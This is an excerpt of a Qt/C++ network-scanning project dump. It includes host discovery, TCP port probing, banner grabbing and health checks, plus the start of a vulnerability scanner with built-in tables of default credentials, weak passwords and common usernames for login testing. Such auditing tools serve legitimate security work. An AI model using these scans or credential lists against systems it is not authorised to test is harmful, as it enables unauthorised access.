Sichere Netzwerk-Scan Durchführung\r\n                            try {\r\n                                performEnhancedNetworkScan(network, prefixLength, iface.name());\r\n                            } catch (...) {\r\n                                qDebug() << \"Exception im Enhanced Network Scan\";\r\n                            }\r\n                        }\r\n                    }\r\n                }\r\n            }\r\n        }\r\n\r\n        if (!interfaceFound) {\r\n            qDebug() << \"Interface nicht gefunden:\" << networkInterface;\r\n        }\r\n\r\n        emit discoveryCompleted(networkInterface);\r\n\r\n    } catch (const std::exception& e) {\r\n        qDebug() << \"Exception in Network Discovery:\" << e.what();\r\n        emit discoveryCompleted(networkInterface);\r\n    } catch (...) {\r\n        qDebug() << \"Unbekannte Exception in Network Discovery\";\r\n        emit discoveryCompleted(networkInterface);\r\n    }\r\n}\r\n\r\nvoid NetworkDiscoveryWorker::performEnhancedNetworkScan(const QString &baseIp, int prefixLength, const QString &interfaceName)\r\n{\r\n    Q_UNUSED(interfaceName)  // Suppress warning\r\n\r\n    if (prefixLength < 16 || prefixLength > 30) {\r\n        return; // Only handle reasonable subnet sizes\r\n    }\r\n\r\n    QStringList ipParts = baseIp.split('.');\r\n    if (ipParts.size() != 4) return;\r\n\r\n    QString networkBase = QString(\"%1.%2.%3.\").arg(ipParts[0], ipParts[1], ipParts[2]);\r\n\r\n    // Enhanced scanning strategy\r\n    QList<int> priorityHosts = {1, 2, 254, 100, 10, 20}; // Likely gateways/servers\r\n    QList<int> commonHosts;\r\n\r\n    // Add range based on prefix length\r\n    if (prefixLength >= 24) {\r\n        for (int i = 1; i <= 254; i++) {\r\n            if (!priorityHosts.contains(i)) {\r\n                commonHosts.append(i);\r\n            }\r\n        }\r\n    }\r\n\r\n    int totalHosts = priorityHosts.size() + qMin(50, commonHosts.size()); // Limit for performance\r\n    int scannedHosts = 0;\r\n\r\n    // Scan priority hosts first\r\n    for (int host : priorityHosts) {\r\n        QString targetIp = networkBase + QString::number(host);\r\n        if (targetIp == baseIp) continue;\r\n\r\n        if (scanHost(targetIp)) {\r\n            QString deviceType = determineDeviceType(targetIp, host);\r\n            QString hostname = resolveHostname(targetIp);\r\n            emit deviceFound(targetIp, hostname, \"\", deviceType);\r\n        }\r\n\r\n        scannedHosts++;\r\n        emit discoveryProgress(scannedHosts, totalHosts);\r\n        QThread::msleep(100); // Rate limiting\r\n    }\r\n\r\n    // Quick scan of sample hosts (limit to 50 for performance)\r\n    int sampleSize = qMin(50, commonHosts.size());\r\n    for (int i = 0; i < sampleSize; i++) {\r\n        int hostIndex = i * (commonHosts.size() / qMax(1, sampleSize));\r\n        if (hostIndex >= commonHosts.size()) break;\r\n\r\n        int host = commonHosts[hostIndex];\r\n        QString targetIp = networkBase + QString::number(host);\r\n        if (targetIp == baseIp) continue;\r\n\r\n        if (quickScanHost(targetIp)) {\r\n            QString deviceType = determineDeviceType(targetIp, host);\r\n            QString hostname = resolveHostname(targetIp);\r\n            emit deviceFound(targetIp, hostname, \"\", deviceType);\r\n        }\r\n\r\n        scannedHosts++;\r\n        emit discoveryProgress(scannedHosts, totalHosts);\r\n        QThread::msleep(50); // Faster rate limiting\r\n    }\r\n}\r\n\r\nbool NetworkDiscoveryWorker::scanHost(const QString &ip)\r\n{\r\n    // Multi-port TCP ping for better detection\r\n    QList<int> ports = {22, 23, 53, 80, 135, 139, 443, 445, 993, 995, 3389, 5900, 8080};\r\n\r\n    for (int port : ports) {\r\n        QTcpSocket socket;\r\n        socket.connectToHost(ip, port, QIODevice::ReadOnly);\r\n        if (socket.waitForConnected(1000)) {\r\n            socket.disconnectFromHost();\r\n            return true;\r\n        }\r\n    }\r\n    return false;\r\n}\r\n\r\nbool NetworkDiscoveryWorker::quickScanHost(const QString &ip)\r\n{\r\n    // Quick scan on most common ports\r\n    QList<int> quickPorts = {22, 80, 443, 135, 445};\r\n\r\n    for (int port : quickPorts) {\r\n        QTcpSocket socket;\r\n        socket.connectToHost(ip, port, QIODevice::ReadOnly);\r\n        if (socket.waitForConnected(500)) {\r\n            socket.disconnectFromHost();\r\n            return true;\r\n        }\r\n    }\r\n    return false;\r\n}\r\n\r\nQString NetworkDiscoveryWorker::determineDeviceType(const QString &ip, int hostNumber)\r\n{\r\n    // Heuristics for device type determination\r\n    if (hostNumber == 1 || hostNumber == 254) {\r\n        return \"Router/Gateway\";\r\n    }\r\n\r\n    // Check for common server ports\r\n    QList<int> serverPorts = {22, 23, 25, 53, 80, 110, 143, 443, 993, 995, 3389, 5432, 3306};\r\n    int serverPortCount = 0;\r\n\r\n    for (int port : serverPorts) {\r\n        QTcpSocket socket;\r\n        socket.connectToHost(ip, port, QIODevice::ReadOnly);\r\n        if (socket.waitForConnected(500)) {\r\n            serverPortCount++;\r\n            socket.disconnectFromHost();\r\n        }\r\n        if (serverPortCount >= 2) break; // Early exit for performance\r\n    }\r\n\r\n    if (serverPortCount >= 3) {\r\n        return \"Server\";\r\n    } else if (serverPortCount > 0) {\r\n        return \"Computer/Device\";\r\n    } else {\r\n        return \"Unknown Device\";\r\n    }\r\n}\r\n\r\nQString NetworkDiscoveryWorker::resolveHostname(const QString &ip)\r\n{\r\n    QHostInfo hostInfo = QHostInfo::fromName(ip);\r\n    if (hostInfo.error() == QHostInfo::NoError && !hostInfo.hostName().isEmpty()) {\r\n        QString hostname = hostInfo.hostName();\r\n        if (hostname != ip && !hostname.isEmpty()) {\r\n            return hostname;\r\n        }\r\n    }\r\n    return QString();\r\n}\r\n\r\n// ============================================================================\r\n// ARP Scanner Worker Implementation\r\n// ============================================================================\r\nArpScanWorker::ArpScanWorker(const QString &interface, QObject *parent)\r\n    : QObject(parent), networkInterface(interface)\r\n{\r\n    setAutoDelete(true);\r\n}\r\n\r\nvoid ArpScanWorker::run()\r\n{\r\n    // Simple ARP scan implementation\r\n    emit arpScanCompleted(0); // Placeholder - would need platform-specific implementation\r\n}\r\n\r\nQString ArpScanWorker::getMacVendor(const QString &mac)\r\n{\r\n    Q_UNUSED(mac)\r\n    return \"Unknown\"; // Placeholder - would need MAC vendor database\r\n}\r\n\r\n// ============================================================================\r\n// Traceroute Worker Implementation\r\n// ============================================================================\r\nTracerouteWorker::TracerouteWorker(const QString &target, QObject *parent)\r\n    : QObject(parent), targetHost(target)\r\n{\r\n    setAutoDelete(true);\r\n}\r\n\r\nvoid TracerouteWorker::run()\r\n{\r\n    // Placeholder implementation\r\n    emit tracerouteCompleted(targetHost, 0);\r\n}\r\n\r\n// ============================================================================\r\n// DNS Lookup Worker Implementation\r\n// ============================================================================\r\nDnsLookupWorker::DnsLookupWorker(const QString &target, QObject *parent)\r\n    : QObject(parent), targetHost(target)\r\n{\r\n    setAutoDelete(true);\r\n}\r\n\r\nvoid DnsLookupWorker::run()\r\n{\r\n    // DNS lookup implementation\r\n    QHostInfo hostInfo = QHostInfo::fromName(targetHost);\r\n\r\n    if (hostInfo.error() == QHostInfo::NoError) {\r\n        QStringList addresses;\r\n        for (const QHostAddress &address : hostInfo.addresses()) {\r\n            addresses.append(address.toString());\r\n        }\r\n        emit dnsResult(hostInfo.hostName(), addresses);\r\n    }\r\n\r\n    emit dnsCompleted(targetHost);\r\n}\r\n\r\n// ============================================================================\r\n// WHOIS Worker Implementation\r\n// ============================================================================\r\nWhoisWorker::WhoisWorker(const QString &target, QObject *parent)\r\n    : QObject(parent), targetHost(target)\r\n{\r\n    setAutoDelete(true);\r\n}\r\n\r\nvoid WhoisWorker::run()\r\n{\r\n    // Placeholder - would need WHOIS protocol implementation\r\n    emit whoisResult(targetHost, \"WHOIS functionality not yet implemented\");\r\n    emit whoisCompleted(targetHost);\r\n}\r\n\r\n// ============================================================================\r\n// Service Detection Worker Implementation\r\n// ============================================================================\r\nServiceDetectionWorker::ServiceDetectionWorker(const QString &ip, int port, QObject *parent)\r\n    : QObject(parent), targetIp(ip), targetPort(port)\r\n{\r\n    setAutoDelete(true);\r\n}\r\n\r\nvoid ServiceDetectionWorker::run()\r\n{\r\n    QString service = \"Unknown\";\r\n    QString version = \"Unknown\";\r\n    QString banner = \"\";\r\n\r\n    // Try to connect and grab banner\r\n    QTcpSocket socket;\r\n    socket.connectToHost(targetIp, targetPort, QIODevice::ReadWrite);\r\n\r\n    if (socket.waitForConnected(3000)) {\r\n        // Service-specific detection\r\n        if (targetPort == 80 || targetPort == 8080) {\r\n            service = detectHttpService(targetIp, targetPort);\r\n        } else if (targetPort == 22) {\r\n            service = detectSshService(targetIp, targetPort);\r\n        } else if (targetPort == 21) {\r\n            service = detectFtpService(targetIp, targetPort);\r\n        } else if (targetPort == 25) {\r\n            service = detectSmtpService(targetIp, targetPort);\r\n        }\r\n\r\n        // Try to read banner\r\n        if (socket.waitForReadyRead(2000)) {\r\n            banner = QString::fromUtf8(socket.readAll()).trimmed();\r\n        }\r\n\r\n        socket.disconnectFromHost();\r\n    }\r\n\r\n    emit serviceDetected(targetIp, targetPort, service, version, banner);\r\n}\r\n\r\nQString ServiceDetectionWorker::detectHttpService(const QString &ip, int port)\r\n{\r\n    QTcpSocket socket;\r\n    socket.connectToHost(ip, port, QIODevice::ReadWrite);\r\n\r\n    if (socket.waitForConnected(2000)) {\r\n        QString request = \"GET / HTTP/1.0\\r\\nHost: \" + ip + \"\\r\\n\\r\\n\";\r\n        socket.write(request.toUtf8());\r\n        socket.flush();\r\n\r\n        if (socket.waitForReadyRead(3000)) {\r\n            QString response = QString::fromUtf8(socket.readAll());\r\n            if (response.contains(\"Server:\")) {\r\n                QRegularExpression serverRegex(R\"(Server:\\s*([^\\r\\n]+))\");\r\n                QRegularExpressionMatch match = serverRegex.match(response);\r\n                if (match.hasMatch()) {\r\n                    return QString(\"HTTP (%1)\").arg(match.captured(1));\r\n                }\r\n            }\r\n            return \"HTTP Server\";\r\n        }\r\n        socket.disconnectFromHost();\r\n    }\r\n\r\n    return \"HTTP\";\r\n}\r\n\r\nQString ServiceDetectionWorker::detectSshService(const QString &ip, int port)\r\n{\r\n    QTcpSocket socket;\r\n    socket.connectToHost(ip, port, QIODevice::ReadWrite);\r\n\r\n    if (socket.waitForConnected(2000)) {\r\n        if (socket.waitForReadyRead(3000)) {\r\n            QString banner = QString::fromUtf8(socket.readAll());\r\n            if (banner.startsWith(\"SSH-\")) {\r\n                return QString(\"SSH (%1)\").arg(banner.trimmed());\r\n            }\r\n        }\r\n        socket.disconnectFromHost();\r\n    }\r\n\r\n    return \"SSH\";\r\n}\r\n\r\nQString ServiceDetectionWorker::detectFtpService(const QString &ip, int port)\r\n{\r\n    QTcpSocket socket;\r\n    socket.connectToHost(ip, port, QIODevice::ReadWrite);\r\n\r\n    if (socket.waitForConnected(2000)) {\r\n        if (socket.waitForReadyRead(3000)) {\r\n            QString banner = QString::fromUtf8(socket.readAll());\r\n            if (banner.startsWith(\"220\")) {\r\n                return QString(\"FTP (%1)\").arg(banner.split('\\n').first().trimmed());\r\n            }\r\n        }\r\n        socket.disconnectFromHost();\r\n    }\r\n\r\n    return \"FTP\";\r\n}\r\n\r\nQString ServiceDetectionWorker::detectSmtpService(const QString &ip, int port)\r\n{\r\n    QTcpSocket socket;\r\n    socket.connectToHost(ip, port, QIODevice::ReadWrite);\r\n\r\n    if (socket.waitForConnected(2000)) {\r\n        if (socket.waitForReadyRead(3000)) {\r\n            QString banner = QString::fromUtf8(socket.readAll());\r\n            if (banner.startsWith(\"220\")) {\r\n                return QString(\"SMTP (%1)\").arg(banner.split('\\n').first().trimmed());\r\n            }\r\n        }\r\n        socket.disconnectFromHost();\r\n    }\r\n\r\n    return \"SMTP\";\r\n}\r\n\r\n// ============================================================================\r\n// Network Health Worker Implementation\r\n// ============================================================================\r\nNetworkHealthWorker::NetworkHealthWorker(const QStringList &targets, QObject *parent)\r\n    : QObject(parent), targetHosts(targets)\r\n{\r\n    setAutoDelete(true);\r\n}\r\n\r\nvoid NetworkHealthWorker::run()\r\n{\r\n    try {\r\n        emit healthCheckStarted(targetHosts.size());\r\n\r\n        int reachableCount = 0;\r\n        int unreachableCount = 0;\r\n\r\n        for (const QString &ip : targetHosts) {\r\n            try {\r\n                int responseTime = -1;\r\n                int packetLoss = 0;\r\n                bool reachable = performPingTest(ip, responseTime, packetLoss);\r\n\r\n                QString status = getHealthStatus(reachable, responseTime, packetLoss);\r\n\r\n                emit hostHealthResult(ip, reachable, responseTime, packetLoss, status);\r\n\r\n                if (reachable) {\r\n                    reachableCount++;\r\n                } else {\r\n                    unreachableCount++;\r\n                }\r\n\r\n                // Rate limiting\r\n                QThread::msleep(100);\r\n\r\n            } catch (...) {\r\n                qDebug() << \"Exception beim Health Check von IP:\" << ip;\r\n                unreachableCount++;\r\n            }\r\n        }\r\n\r\n        emit healthCheckCompleted(targetHosts.size(), reachableCount, unreachableCount);\r\n\r\n    } catch (const std::exception& e) {\r\n        qDebug() << \"Exception in Network Health Check:\" << e.what();\r\n        emit healthCheckCompleted(0, 0, 0);\r\n    } catch (...) {\r\n        qDebug() << \"Unbekannte Exception in Network Health Check\";\r\n        emit healthCheckCompleted(0, 0, 0);\r\n    }\r\n}\r\n\r\nbool NetworkHealthWorker::performPingTest(const QString &ip, int &responseTime, int &packetLoss)\r\n{\r\n    // Multi-method ping test for reliability\r\n    QElapsedTimer timer;\r\n    timer.start();\r\n\r\n    // Method 1: TCP ping to common ports\r\n    QList<int> testPorts = {80, 443, 22, 23, 25, 53, 135, 139, 445};\r\n    bool tcpSuccess = false;\r\n\r\n    for (int port : testPorts) {\r\n        QTcpSocket socket;\r\n        timer.restart();\r\n        socket.connectToHost(ip, port, QIODevice::ReadOnly);\r\n        if (socket.waitForConnected(2000)) {\r\n            responseTime = timer.elapsed();\r\n            tcpSuccess = true;\r\n            socket.disconnectFromHost();\r\n            break;\r\n        }\r\n    }\r\n\r\n    if (tcpSuccess) {\r\n        packetLoss = 0; // TCP connection successful\r\n        return true;\r\n    }\r\n\r\n    // Method 2: Multiple quick attempts to estimate packet loss\r\n    int attempts = 3;\r\n    int successes = 0;\r\n    QList<int> responseTimes;\r\n\r\n    for (int i = 0; i < attempts; i++) {\r\n        timer.restart();\r\n        QTcpSocket socket;\r\n        socket.connectToHost(ip, 80, QIODevice::ReadOnly);\r\n        if (socket.waitForConnected(1500)) {\r\n            responseTimes.append(timer.elapsed());\r\n            successes++;\r\n            socket.disconnectFromHost();\r\n        }\r\n        QThread::msleep(500); // Wait between attempts\r\n    }\r\n\r\n    if (successes > 0) {\r\n        // Calculate average response time\r\n        int totalTime = 0;\r\n        for (int time : responseTimes) {\r\n            totalTime += time;\r\n        }\r\n        responseTime = totalTime / successes;\r\n        packetLoss = ((attempts - successes) * 100) / attempts;\r\n        return true;\r\n    }\r\n\r\n    responseTime = -1;\r\n    packetLoss = 100;\r\n    return false;\r\n}\r\n\r\nQString NetworkHealthWorker::getHealthStatus(bool reachable, int responseTime, int packetLoss)\r\n{\r\n    if (!reachable) {\r\n        return \"Nicht erreichbar 🔴\";\r\n    }\r\n\r\n    if (packetLoss == 0 && responseTime < 50) {\r\n        return \"Ausgezeichnet 🟢\";\r\n    } else if (packetLoss < 20 && responseTime < 200) {\r\n        return \"Gut 🟡\";\r\n    } else if (packetLoss < 50 && responseTime < 1000) {\r\n        return \"Mäßig 🟠\";\r\n    } else {\r\n        return \"Kritisch 🔴\";\r\n    }\r\n}\r\n",
          "relativePath": "scanworkers.cpp"
        },
        {
          "name": "scanworkers.h",
          "type": "file",
          "content": "// Korrigierte scanworkers.h - Header mit Crash-Fix\r\n\r\n#ifndef SCANWORKERS_H\r\n#define SCANWORKERS_H\r\n\r\n#include <QtCore/QObject>\r\n#include <QtCore/QRunnable>\r\n#include <QtCore/QThread>\r\n#include <QtNetwork/QTcpSocket>\r\n#include <QtCore/QElapsedTimer>\r\n#include <QtCore/QDateTime>\r\n#include <QtNetwork/QHostInfo>\r\n#include <QtNetwork/QNetworkInterface>\r\n#include <QtNetwork/QNetworkAddressEntry>\r\n#include <QtNetwork/QAbstractSocket>\r\n#include <QtCore/QRegularExpression>\r\n#include <QtCore/QMap>\r\n#include <QtCore/QPair>\r\n#include <QtCore/QMutex>\r\n\r\n// Enhanced Host information structure\r\nstruct HostInfo {\r\n    QString ip;\r\n    QString hostname;\r\n    QString macAddress;\r\n    QString vendor;\r\n    QStringList openPorts;\r\n    QStringList services;\r\n    QString os;\r\n    int responseTime;\r\n    bool isAlive;\r\n    QDateTime lastSeen;\r\n    QString notes;\r\n    QString deviceType;     // New: Desktop, Server, Router, etc.\r\n    QString location;       // New: Physical location if known\r\n    int openPortCount;      // New: Quick reference\r\n    QString lastService;    // New: Most recent service detected\r\n    bool isSecure;         // New: Has SSL/TLS services\r\n};\r\n\r\n// Enhanced worker classes for threading\r\nclass ScanWorker : public QObject, public QRunnable\r\n{\r\n    Q_OBJECT\r\n\r\npublic:\r\n    ScanWorker(const QString &ip, int timeout, QObject *parent = nullptr);\r\n    void run() override;\r\n    void setHostIndex(int index);  // New: for progress tracking\r\n\r\nsignals:\r\n    void hostFound(const HostInfo &host);\r\n    void hostCompleted();  // New: signal when host scan is complete\r\n    void progress(int percentage);\r\n    void statusUpdate(const QString &message);  // New: for detailed status\r\n\r\nprivate:\r\n    QString targetIp;\r\n    int scanTimeout;\r\n    int hostIndex;\r\n\r\n    // Enhanced helper methods\r\n    QString detectOperatingSystem(const QString &ip);\r\n    QString getServiceName(int port);\r\n    bool quickPortCheck(const QString &ip, int port, int timeout = 1000);\r\n};\r\n\r\nclass PortScanWorker : public QObject, public QRunnable\r\n{\r\n    Q_OBJECT\r\n\r\npublic:\r\n    PortScanWorker(const QString &ip, const QList<int> &ports, QObject *parent = nullptr);\r\n    void run() override;\r\n\r\nsignals:\r\n    // Enhanced signal with more details - this is the main one we'll use\r\n    void portResult(const QString &ip, int port, bool open, const QString &service,\r\n                    const QString &version, const QString &banner, int responseTime);\r\n\r\n    void scanStarted(const QString &ip, int totalPorts);\r\n    void scanProgress(int scannedPorts, int totalPorts);\r\n    void scanCompleted(const QString &ip, int portsScanned, qint64 totalTime);\r\n\r\nprivate:\r\n    QString targetIp;\r\n    QList<int> targetPorts;\r\n    int totalPorts;\r\n    int scannedPorts;\r\n\r\n    // Enhanced helper methods\r\n    bool isPortOpen(const QString &ip, int port);\r\n    QString getServiceName(int port);\r\n    QPair<QString, QString> grabBanner(const QString &ip, int port);\r\n    QString getProbeForPort(int port);\r\n    QString extractVersionFromBanner(const QString &banner, const QString &service);\r\n};\r\n\r\nclass PingWorker : public QObject, public QRunnable\r\n{\r\n    Q_OBJECT\r\n\r\npublic:\r\n    PingWorker(const QString &ip, QObject *parent = nullptr);\r\n    void run() override;\r\n\r\nsignals:\r\n    void pingResult(const QString &ip, bool alive, int responseTime);\r\n    void pingCompleted(const QString &ip, bool alive, int responseTime, const QString &method);  // Enhanced\r\n\r\nprivate:\r\n    QString targetIp;\r\n\r\n    // Enhanced ping methods\r\n    bool tcpPing(const QString &ip, int port, int timeout);\r\n    bool icmpPing(const QString &ip, int timeout);  // Future implementation\r\n};\r\n\r\n// New: Network Discovery Worker\r\nclass NetworkDiscoveryWorker : public QObject, public QRunnable\r\n{\r\n    Q_OBJECT\r\n\r\npublic:\r\n    NetworkDiscoveryWorker(const QString &interface, QObject *parent = nullptr);\r\n    void run() override;\r\n\r\nsignals:\r\n    void discoveryStarted(const QString &interface);\r\n    void networkFound(const QString &network, int prefixLength, const QString &interface, const QString &mac);\r\n    void deviceFound(const QString &ip, const QString &hostname, const QString &mac, const QString &type);\r\n    void discoveryProgress(int scannedHosts, int totalHosts);\r\n    void discoveryCompleted(const QString &interface);\r\n\r\nprivate:\r\n    QString networkInterface;\r\n\r\n    // Private helper methods\r\n    void performEnhancedNetworkScan(const QString &baseIp, int prefixLength, const QString &interfaceName);\r\n    bool scanHost(const QString &ip);\r\n    bool quickScanHost(const QString &ip);\r\n    QString determineDeviceType(const QString &ip, int hostNumber);\r\n    QString resolveHostname(const QString &ip);\r\n};\r\n\r\n// New: ARP Scanner Worker\r\nclass ArpScanWorker : public QObject, public QRunnable\r\n{\r\n    Q_OBJECT\r\n\r\npublic:\r\n    ArpScanWorker(const QString &interface, QObject *parent = nullptr);\r\n    void run() override;\r\n\r\nsignals:\r\n    void arpEntryFound(const QString &ip, const QString &mac, const QString &vendor);\r\n    void arpScanCompleted(int entriesFound);\r\n\r\nprivate:\r\n    QString networkInterface;\r\n    QString getMacVendor(const QString &mac);  // MAC address vendor lookup\r\n};\r\n\r\n// New: Traceroute Worker\r\nclass TracerouteWorker : public QObject, public QRunnable\r\n{\r\n    Q_OBJECT\r\n\r\npublic:\r\n    TracerouteWorker(const QString &target, QObject *parent = nullptr);\r\n    void run() override;\r\n\r\nsignals:\r\n    void hopFound(int hopNumber, const QString &ip, const QString &hostname, int responseTime);\r\n    void tracerouteCompleted(const QString &target, int totalHops);\r\n\r\nprivate:\r\n    QString targetHost;\r\n};\r\n\r\n// New: DNS Lookup Worker\r\nclass DnsLookupWorker : public QObject, public QRunnable\r\n{\r\n    Q_OBJECT\r\n\r\npublic:\r\n    DnsLookupWorker(const QString &target, QObject *parent = nullptr);\r\n    void run() override;\r\n\r\nsignals:\r\n    void dnsResult(const QString &hostname, const QStringList &addresses);\r\n    void dnsReverse(const QString &ip, const QString &hostname);\r\n    void dnsCompleted(const QString &target);\r\n\r\nprivate:\r\n    QString targetHost;\r\n};\r\n\r\n// New: WHOIS Lookup Worker\r\nclass WhoisWorker : public QObject, public QRunnable\r\n{\r\n    Q_OBJECT\r\n\r\npublic:\r\n    WhoisWorker(const QString &target, QObject *parent = nullptr);\r\n    void run() override;\r\n\r\nsignals:\r\n    void whoisResult(const QString &target, const QString &whoisData);\r\n    void whoisCompleted(const QString &target);\r\n\r\nprivate:\r\n    QString targetHost;\r\n};\r\n\r\n// New: Service Detection Worker\r\nclass ServiceDetectionWorker : public QObject, public QRunnable\r\n{\r\n    Q_OBJECT\r\n\r\npublic:\r\n    ServiceDetectionWorker(const QString &ip, int port, QObject *parent = nullptr);\r\n    void run() override;\r\n\r\nsignals:\r\n    void serviceDetected(const QString &ip, int port, const QString &service,\r\n                         const QString &version, const QString &banner);\r\n\r\nprivate:\r\n    QString targetIp;\r\n    int targetPort;\r\n\r\n    QString detectHttpService(const QString &ip, int port);\r\n    QString detectSshService(const QString &ip, int port);\r\n    QString detectFtpService(const QString &ip, int port);\r\n    QString detectSmtpService(const QString &ip, int port);\r\n};\r\n\r\n// KORRIGIERTE EnhancedArpScanWorker Klasse mit Crash-Fix\r\nclass EnhancedArpScanWorker : public QObject, public QRunnable\r\n{\r\n    Q_OBJECT\r\n\r\npublic:\r\n    EnhancedArpScanWorker(const QString &interface, QObject *parent = nullptr);\r\n    void run() override;\r\n\r\nsignals:\r\n    void arpScanStarted(const QString &interface);\r\n    void arpEntryFound(const QString &ip, const QString &mac, const QString &vendor);\r\n    void arpScanProgress(int scannedEntries, int totalEntries);\r\n    void arpScanCompleted(int entriesFound);\r\n\r\nprivate:\r\n    QString networkInterface;\r\n\r\n    // Thread-safe helper methods\r\n    QString getMacVendor(const QString &mac);\r\n    QStringList getLocalNetworkIPs();\r\n\r\n    // NEUE Methoden für Crash-Fix\r\n    void performAdditionalPingSweep(QStringList &foundIPs, int &entriesFound);\r\n    bool quickTcpPing(const QString &ip);\r\n    QString getMacFromArpTable(const QString &ip);\r\n};\r\n\r\n// KORRIGIERTE NetworkHealthWorker Klasse mit Exception Handling\r\nclass NetworkHealthWorker : public QObject, public QRunnable\r\n{\r\n    Q_OBJECT\r\n\r\npublic:\r\n    NetworkHealthWorker(const QStringList &targets, QObject *parent = nullptr);\r\n    void run() override;\r\n\r\nsignals:\r\n    void healthCheckStarted(int totalTargets);\r\n    void hostHealthResult(const QString &ip, bool reachable, int responseTime,\r\n                          int packetLoss, const QString &status);\r\n    void healthCheckCompleted(int totalHosts, int reachableHosts, int unreachableHosts);\r\n\r\nprivate:\r\n    QStringList targetHosts;\r\n    bool performPingTest(const QString &ip, int &responseTime, int &packetLoss);\r\n    QString getHealthStatus(bool reachable, int responseTime, int packetLoss);\r\n};\r\n\r\n#endif // SCANWORKERS_H\r\n",
          "relativePath": "scanworkers.h"
        },
        {
          "name": "vulnerabilityscanner.cpp",
          "type": "file",
          "content": "#include \"VulnerabilityScanner.h\"\r\n#include <QtCore/QDebug>\r\n#include <QtCore/QThread>\r\n#include <QtCore/QCoreApplication>\r\n#include <QtNetwork/QNetworkAccessManager>\r\n#include <QtNetwork/QNetworkRequest>\r\n#include <QtNetwork/QNetworkReply>\r\n#include <QtCore/QJsonDocument>\r\n#include <QtNetwork/QSslCipher>\r\n#include <QtNetwork/QUdpSocket>\r\n\r\n// Static member definitions\r\nconst QMap<QString, QList<int>> VulnerabilityScanner::commonServicePorts = {\r\n    {\"HTTP\", {80, 8080, 8000, 8888, 3000, 5000, 8443}},\r\n    {\"HTTPS\", {443, 8443, 9443}},\r\n    {\"SSH\", {22, 2222}},\r\n    {\"FTP\", {21, 2121}},\r\n    {\"Telnet\", {23, 2323}},\r\n    {\"SMTP\", {25, 587, 465}},\r\n    {\"DNS\", {53}},\r\n    {\"SMB\", {139, 445}},\r\n    {\"SNMP\", {161, 162}},\r\n    {\"RDP\", {3389}},\r\n    {\"VNC\", {5900, 5901, 5902}},\r\n    {\"MySQL\", {3306}},\r\n    {\"PostgreSQL\", {5432}},\r\n    {\"MSSQL\", {1433}},\r\n    {\"Oracle\", {1521}},\r\n    {\"MongoDB\", {27017}},\r\n    {\"Redis\", {6379}},\r\n    {\"Elasticsearch\", {9200, 9300}}\r\n};\r\n\r\nconst QMap<QString, QStringList> VulnerabilityScanner::defaultCredentials = {\r\n    {\"admin\", {\"admin\", \"password\", \"123456\", \"\", \"admin123\", \"root\"}},\r\n    {\"root\", {\"root\", \"toor\", \"password\", \"\", \"123456\", \"admin\"}},\r\n    {\"user\", {\"user\", \"password\", \"123456\", \"\"}},\r\n    {\"guest\", {\"guest\", \"\", \"password\"}},\r\n    {\"default\", {\"default\", \"password\", \"\"}},\r\n    {\"cisco\", {\"cisco\", \"admin\", \"password\"}},\r\n    {\"sa\", {\"\", \"sa\", \"password\", \"admin\"}},\r\n    {\"postgres\", {\"postgres\", \"password\", \"admin\"}},\r\n    {\"mysql\", {\"mysql\", \"password\", \"root\"}},\r\n    {\"oracle\", {\"oracle\", \"password\", \"admin\"}},\r\n    {\"test\", {\"test\", \"password\", \"123456\"}},\r\n    {\"demo\", {\"demo\", \"password\", \"\"}},\r\n    {\"ftp\", {\"ftp\", \"anonymous\", \"password\"}},\r\n    {\"anonymous\", {\"\", \"anonymous\", \"guest\"}}\r\n};\r\n\r\nconst QStringList VulnerabilityScanner::weakPasswords = {\r\n    \"123456\", \"password\", \"123456789\", \"12345678\", \"12345\", \"1234567\", \"1234567890\",\r\n    \"qwerty\", \"abc123\", \"111111\", \"password1\", \"admin\", \"letmein\", \"welcome\",\r\n    \"monkey\", \"dragon\", \"pass\", \"master\", \"hello\", \"freedom\", \"whatever\",\r\n    \"qazwsx\", \"trustno1\", \"jordan23\", \"harley\", \"robert\", \"matthew\", \"jordan\",\r\n    \"michelle\", \"daniel\", \"anthony\", \"joshua\", \"buster\", \"hannah\", \"thomas\",\r\n    \"summer\", \"melissa\", \"life\", \"love\", \"family\", \"secret\", \"god\", \"jesus\"\r\n};\r\n\r\nconst QStringList VulnerabilityScanner::commonUsernames = {\r\n    \"admin\", \"administrator\", \"root\", \"user\", \"guest\", \"test\", \"demo\", \"default\",\r\n    \"service\", \"operator\", \"manager\", \"support\", \"helpdesk\", \"backup\", \"oracle\",\r\n    \"postgres\", \"mysql\", \"sql\", \"db\", \"database\", \"web\", \"www\", \"ftp\", \"mail\",\r\n    \"email\", \"postmaster\", \"webmaster\", \"sa\", \"dba\", \"dev\", \"developer\"\r\n};\r\n\r\n\r\n// ============================================================================\r\n// VulnerabilityScanner Implementation\r\n// ============================================================================\r\n\r\nVulnerabilityScanner::VulnerabilityScanner(const QString &targetIp, QObject *parent)\r\n    : QObject(parent), enableCredentialTests(true), enableSSLTests(true),\r\n    enableServiceTests(true), connectionTimeout(5000), threadSafeMode(false)\r\n{\r\n    targetIps << targetIp;\r\n    setAutoDelete(true);\r\n\r\n    // Default port range - common vulnerable services\r\n    portRange = {21, 22, 23, 25, 53, 80, 110, 135, 139, 143, 443, 445, 993, 995,\r\n                 1433, 1521, 3306, 3389, 5432, 5900, 6379, 8080, 27017};\r\n}\r\n\r\n\r\nVulnerabilityScanner::VulnerabilityScanner(const QStringList &targetIps, QObject *parent)\r\n    : QObject(parent), targetIps(targetIps), enableCredentialTests(true),\r\n    enableSSLTests(true), enableServiceTests(true), connectionTimeout(5000), threadSafeMode(false)\r\n{\r\n    setAutoDelete(true);\r\n\r\n    // Default port range\r\n    portRange = {21, 22, 23, 25, 53, 80, 110, 135, 139, 143, 443, 445, 993, 995,\r\n                 1433, 1521, 3306, 3389, 5432, 5900, 6379, 8080, 27017};\r\n}\r\n\r\nvoid VulnerabilityScanner::setPortRange(const QList<int> &ports)\r\n{\r\n    portRange = ports;\r\n}\r\n\r\nvoid VulnerabilityScanner::enableCredentialTesting(bool enable)\r\n{\r\n    enableCredentialTests = enable;\r\n}\r\n\r\nvoid VulnerabilityScanner::enableSSLTesting(bool enable)\r\n{\r\n    enableSSLTests = enable;\r\n}\r\n\r\nvoid VulnerabilityScanner::enableServiceTesting(bool enable)\r\n{\r\n    enableServiceTests = enable;\r\n}\r\n\r\nvoid VulnerabilityScanner::setTimeout(int timeoutMs)\r\n{\r\n    connectionTimeout = timeoutMs;\r\n}\r\n\r\nvoid VulnerabilityScanner::setThreadSafe(bool threadSafe)\r\n{\r\n    threadSafeMode = threadSafe;\r\n}\r\n\r\nvoid VulnerabilityScanner::run()\r\n{\r\n    try 